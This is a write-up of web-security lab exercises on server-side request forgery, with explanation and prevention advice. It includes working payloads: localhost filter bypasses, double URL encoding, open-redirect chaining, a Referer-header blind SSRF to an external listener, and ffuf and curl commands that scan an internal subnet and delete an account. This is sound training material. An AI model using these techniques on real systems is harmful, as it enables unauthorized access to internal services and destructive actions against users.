# What is SSRF?

Server-side request forgery (SSRF) is a vulnerability that allows an attacker to cause the server to make HTTP requests to an unintended location. Because those requests originate from the server itself, they often bypass network-level access controls that restrict external clients. The classic target is an internal admin interface that is only accessible from localhost or a private subnet.

# How are SSRF vulnerabilities exploited?

The simplest case is a parameter that directly accepts a URL, such as a stock-check endpoint whose value can be changed to point at `http://localhost/admin`. Beyond that, several evasion techniques exist for when basic filters are in place:

- **Alternative localhost representations:** `http://2130706433` (decimal), `http://127.1`, `http://017700000001` (octal) all resolve to 127.0.0.1 and can slip past naive blacklists.
- **URL encoding and double encoding:** encoding characters in the path (e.g. `%2561dmin` for `admin`) can evade filters that match plain strings.
- **Open redirection chaining:** if a parameter the server follows for a redirect accepts a full URL, that redirect can point the server at an internal address even when the SSRF parameter itself is blocked.
- **Blind SSRF:** the server makes an outbound request but the response is never returned to the attacker. Confirmation requires an out-of-band channel such as DNS interaction with an external listener. A common attack surface is the `Referer` header processed by analytics services.

# How to prevent SSRF?

- Use a strict allowlist of permitted destinations rather than a blacklist of forbidden ones.
- Avoid forwarding raw user-supplied URLs to back-end systems; resolve to internal IDs server-side and map them to the real addresses.
- Disable HTTP redirects in components that make server-side requests.
- Validate that the resolved IP address of any user-supplied hostname is not in a private or loopback range.

# 1. Basic SSRF against the local server

The product stock-check feature sends a POST request to `/product/stock` with a form body containing `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`. The server fetches that URL and returns the stock level as a plain number.

![Product page with stock check](screenshots/01_01_product_page_and_request.png)
![Request body showing stockApi parameter](screenshots/01_02_product_request_body.png)
![Response body containing the stock number](screenshots/01_03_product_response_body.png)

- Replacing the `stockApi` value with `http://localhost/admin` causes the server to fetch its own admin panel and return the HTML in the response. The page contains links `<a href="/admin/delete?username=wiener">` and `<a href="/admin/delete?username=carlos">`.
- Sending the same request with `stockApi=http://localhost/admin/delete?username=carlos` deletes the account.

![Admin page returned via localhost SSRF](screenshots/01_04_localhost.png)
![Delete request targeting carlos](screenshots/01_05_delete.png)

# 2. Basic SSRF against a back-end system

The same stock-check endpoint is present, but the target is not localhost — it is an admin interface somewhere on the internal `192.168.0.0/24` network on port 8080. The subnet is not reachable directly, but the server can reach it.

- `ffuf` was used to enumerate the subnet by fuzzing the last octet of `stockApi=http://192.168.0.FUZZ:8080/admin`, filtering for HTTP 200 responses.

![ffuf scan output finding 192.168.0.205](screenshots/02_01_ffuf.png)

**assets/ffuf.sh:**
```sh
ffuf -u 'https://0ad1009304d8dc7c823ccade009a00bd.web-security-academy.net/product/stock' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=HAMjJPJUpMTP8Sfzhpuo1OI1egt2xZ9p' \
  -d 'stockApi=http://192.168.0.FUZZ:8080/admin' \
  -w <(seq 1 255) \
  -mc 200
```

- The scan found `192.168.0.205:8080/admin`. Sending the stock request with that address returns the same admin panel as before.

![Admin request to 192.168.0.205](screenshots/02_02_admin_request.png)

- The delete was performed with `curl` to avoid re-navigating in the browser.

![Delete carlos via curl](screenshots/02_03_delete.png)

**assets/delete.sh:**
```sh
curl 'https://0ad1009304d8dc7c823ccade009a00bd.web-security-academy.net/product/stock' \
  --compressed -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=vgjX6Ei30obyr4Vv9rjchBmLquiXDdlL' \
  --data-raw 'stockApi=http://192.168.0.205:8080/admin/delete?username=carlos'
```

# 3. SSRF with blacklist-based input filter

The same endpoint now has a filter. Sending `stockApi=http://localhost/admin` returns a 400 response with the message "External stock check blocked for security reasons".

![Blocked request and error response](screenshots/03_01_blocked_request.png)
![400 error message](screenshots/03_02_blocked_response.png)

- Alternative localhost representations were tried next. `http://2130706433` (decimal for 127.0.0.1) without a path is not blocked and returns a 500 HTML page. However, appending `/admin` — as `http://2130706433/admin` or `http://127.1/admin` is still blocked, as is `http://2130706433/%61dmin` (single URL encoding of `a`).

![2130706433 without path not blocked](screenshots/03_05_no_admin_not_blocked.png)
![2130706433/admin blocked](screenshots/03_03_blocked_2130706433.png)
![127.1/admin blocked](screenshots/03_04_blocked_127.1.png)

- The Hackvertor extension for Burp Suite was installed to apply double URL encoding. Selecting the word `admin` in the request and choosing Extensions -> Hackvertor -> Encode -> urlencode_all twice produces double URL encoded string for `admin`, which the filter does not match.

![Installing Hackvertor extension](screenshots/03_06_install_hackvertor.png)
![Double URL encoding applied to admin](screenshots/03_07_double_url_encode.png)

- Adding `/delete?username=carlos` to the request deletes the account.

![Delete successful](screenshots/03_08_delete.png)

# 4. SSRF with filter bypass via open redirection

The `stockApi` parameter is now validated and cannot be pointed at an internal address directly.

![Stock check with validated stockApi](screenshots/04_01_stock_not_vulenerable.png)

- The product page has a "Next product" link that sends a request to `/product/nextProduct?currentProductId=1&path=/product?productId=2`. The `path` parameter is used as an open redirect (the server issues a redirect to whatever value is supplied).

![nextProduct request with path parameter](screenshots/04_02_next_product_request.png)
![Redirect to the path value](screenshots/04_03_next_product_redirect.png)

- Setting `path=http://192.168.0.12:8080/admin` makes the nextProduct endpoint redirect to the internal admin panel. Passing this full nextProduct URL as the `stockApi` value causes the stock-check server to follow the redirect and fetch the admin page.

![stockApi set to nextProduct redirect URL](screenshots/04_04_stock_api_next_product_redirect.png)

- The admin page is returned and the delete request is sent in the same way.

![Delete carlos](screenshots/04_05_delete.png)

# 5. Blind SSRF via Referer header

The product page is not vulnerable through `stockApi`, but an analytics service on the server processes the `Referer` header of incoming requests and fetches the URL it contains. The response is never returned to the browser, making this a blind SSRF.

![Product page request in the browser](screenshots/05_01_product_page_request.png)
![Referer header visible in Burp Proxy](screenshots/05_02_burp_proxy.png)

- The request was sent to Burp Repeater and the `Referer` header value was replaced with a webhook.site URL to confirm that the server makes an outbound request.

![Request in Repeater with original Referer](screenshots/05_03_burp_repeater.png)
![Referer replaced with webhook.site](screenshots/05_04_referer_webhook.site.png)

- The intended exfiltration target for this lab is Burp Collaborator, which is behind a paywall. Other options such as `webhook.site` are intentionally blocked by the lab, so the actual output is not confirmed.
